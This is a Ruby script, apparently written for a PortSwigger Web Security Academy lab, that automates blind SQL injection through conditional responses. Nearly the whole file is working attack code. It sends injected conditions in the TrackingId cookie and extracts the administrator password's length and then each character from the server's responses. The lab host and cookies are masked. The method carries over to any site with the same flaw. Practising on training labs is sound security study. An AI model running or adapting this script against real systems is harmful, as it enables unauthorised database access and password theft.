#############################################################################################
#     Built this solely because I'm too lazy to put this through intruder repeatedly 
#      for the sake of exercise to find one character at a time...
#
#     https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses
#
#     ruby conditional_response.rb
#############################################################################################
require 'socket'
require 'openssl'
require 'uri'

$loweralphanumchars = "0123456789abcdefghijklmnopqrstuvwxyz"
$alphanumchars="0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
$usrlen = 0
$pwlen = 0
$user = "administrator"                                             #This would normally be enumerated but the lab provides it
$pass = 0

$path = "/filter?category=pets'"                                    #Guaranteed Empty Page (reduce traffic)
$host = "################################.web-security-academy.net" #Portswigger Academy Server
$port = 443                                                         #Server Port
$tc = "################"                                            #TrackingID Cookie
$sc = "################################"                            #Session Cookie
$cstr = "#############"                                             #Conditional Response String

def quickvalidator()
	cline="\n-------------------------------------------------------\n"
	cookie = "TrackingId=#$tc; session=#$sc"
	print "Doing a Basic Application Connection Test\n"
	begin
		s = TCPSocket.new($host, $port)
		sslc = OpenSSL::SSL::SSLContext.new
		ssl_s = OpenSSL::SSL::SSLSocket.new(s, sslc)
		ssl_s.connect
		r = "GET #$path HTTP/1.1\r\nHost: #$host\r\nCookie: #{cookie}\r\nConnection: close\r\n\r\n"
		print "Simple Payload: #{cline}#{r}#{cline}"
		ssl_s.puts(r)
		response = ssl_s.read
		ssl_s.close
		s.close
		status_code = response.split[1].to_i
		if status_code == 200
			print "#{status_code} Received. #{cline}"
			return true
		else
			puts "Could Not Connect to the Application"
			print "#{cline}#{response}#{cline}"
			exit(1)
		end
	rescue => e
		puts "An error occured: #{e.message}"
		false
	end	
end

def bsqlicr(sqli)
	urlencodesqli=URI.encode_www_form_component(sqli) #url encodes the sqli payload
	cline="\n-------------------------------------------------------\n"
	cookie = "TrackingId=#$tc#{urlencodesqli}; session=#$sc"
	begin
		s = TCPSocket.new($host, $port)
		sslc = OpenSSL::SSL::SSLContext.new
		ssl_s = OpenSSL::SSL::SSLSocket.new(s, sslc)
		ssl_s.connect
		r = "GET #$path HTTP/1.1\r\nHost: #$host\r\nCookie: #{cookie}\r\nConnection: close\r\n\r\n"
		ssl_s.puts(r)
		response = ssl_s.read
		ssl_s.close
		s.close
		status_code = response.split[1].to_i
		if status_code == 200 && response.include?($cstr) 
			return true
		else
			if status_code != 200
				print "#{cline}#{response}#{cline}\n"
				exit(1)
			else
				return false
			end
		end
	rescue => e
		puts "An error occured: #{e.message}"
		false
	end	
end

def findadminpass()
	user = $user
	print "Finding the Password for #{user}\n"
	l = 0
	chars = $loweralphanumchars
	testpass = ""
	while l <= $pwlen + 1
		l+=1
		if l <= $pwlen + 1
			chars.each_char do |char| #iterate thru each char
				basesqli = "' AND (SELECT SUBSTRING(password,#{l},1) FROM users WHERE username='#{user}')='#{char}"
				if bsqlicr(basesqli)
					testpass+=char
					print "\n#{testpass}\n"
					break
				else
					print "Trying Char[#{l}]: #{char}\r"
				end
			end
		end
		
	end
	if testpass.length == $pwlen
		print "\n\nThe password is: #{testpass}\n\n"
	end
end


def findadminpasslen()
	user = $user
	print "Finding the Length of #{user}'s Password\n"
	c = 0
	while $pwlen == 0 do
		c+=1
		basesql = "' AND (SELECT 'a' FROM users WHERE username='#{user}' AND LENGTH(password)=#{c})='a"
		if bsqlicr(basesql)
			print "\nFound the Password Length of #{c}\n"
			$pwlen = c
		else
			print "Trying Length: #{c}\r"
		end
		if c == 60
			puts "Something went wrong here... 40 characters is a lot"
			exit(1)
		end
	end
end

# Do the things
quickvalidator
findadminpasslen
findadminpass